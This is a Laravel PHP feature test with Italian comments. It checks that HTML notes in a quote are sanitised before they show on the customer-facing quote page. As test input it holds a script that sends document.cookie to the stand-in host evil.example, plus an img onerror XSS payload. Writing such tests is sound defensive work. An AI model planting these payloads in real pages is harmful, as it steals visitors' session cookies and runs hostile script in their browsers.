<?php

namespace Tests\Feature;

use App\Models\Customer;
use App\Models\Product;
use App\Models\Quote;
use App\Models\QuoteProduct;
use App\Models\Tenant;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Le note del preventivo sono un RichEditor, quindi escono con {!! !!}: il
 * loro HTML e' il punto. Filament pero' non le sanifica lato server — quello
 * che arriva e' l'HTML mandato dal browser via Livewire, e un client
 * manomesso manda quello che vuole.
 *
 * La pagina pubblica del preventivo la apre il CLIENTE, che non c'entra
 * niente con chi ha scritto la nota: uno <script> li' dentro girava nel suo
 * browser. Qui si verifica sul confine vero, la risposta HTTP, non solo
 * sulla funzione che ripulisce (per quella c'e' HtmlSicuroTest).
 */
class NoteSanificateTest extends TestCase
{
    use RefreshDatabase;

    private function preventivoConNote(string $note): Quote
    {
        $tenant = Tenant::create(['name' => 'Alex', 'slug' => 'alex', 'is_master' => true]);
        $cliente = Customer::create(['tenant_id' => $tenant->id, 'company_name' => 'Bar Centrale']);
        $macchina = Product::create(['sku' => 'WE8-'.uniqid(), 'type' => Product::TYPE_MACHINE, 'name' => 'WE8']);

        $preventivo = Quote::create([
            'tenant_id' => $tenant->id, 'customer_id' => $cliente->id,
            'date' => now(), 'status' => 'inviato', 'notes' => $note,
        ]);

        QuoteProduct::create([
            'quote_id' => $preventivo->id, 'product_id' => $macchina->id,
            'quantity' => 1, 'price' => 2600, 'discount' => 0, 'tax' => 22,
        ]);
        $preventivo->updateTotal();

        return $preventivo->fresh();
    }

    public function test_lo_script_nelle_note_non_arriva_al_cliente(): void
    {
        $preventivo = $this->preventivoConNote(
            '<p>Macchina con macinacaffe.</p><script>fetch("https://evil.example/"+document.cookie)</script>'
        );

        $risposta = $this->get($preventivo->clientUrl());

        $risposta->assertOk();
        $risposta->assertSee('Macchina con macinacaffe.', escape: false);
        $risposta->assertDontSee('evil.example');
        $risposta->assertDontSee('document.cookie');
    }

    public function test_nemmeno_travestito_da_immagine_rotta(): void
    {
        $preventivo = $this->preventivoConNote('<img src=x onerror="alert(document.domain)"><p>Nota</p>');

        $risposta = $this->get($preventivo->clientUrl());

        $risposta->assertOk();
        $risposta->assertDontSee('onerror', escape: false);
        $risposta->assertSee('Nota', escape: false);
    }

    /** La formattazione vera deve continuare ad arrivare: e' il motivo per cui e' un RichEditor. */
    public function test_la_formattazione_buona_resta(): void
    {
        $preventivo = $this->preventivoConNote('<p>Macchina <strong>WE8</strong> con <em>macinacaffe</em>.</p><ul><li>Garanzia 24 mesi</li></ul>');

        $risposta = $this->get($preventivo->clientUrl());

        $risposta->assertOk();
        $risposta->assertSee('<strong>WE8</strong>', escape: false);
        $risposta->assertSee('<em>macinacaffe</em>', escape: false);
        $risposta->assertSee('<li>Garanzia 24 mesi</li>', escape: false);
    }
}
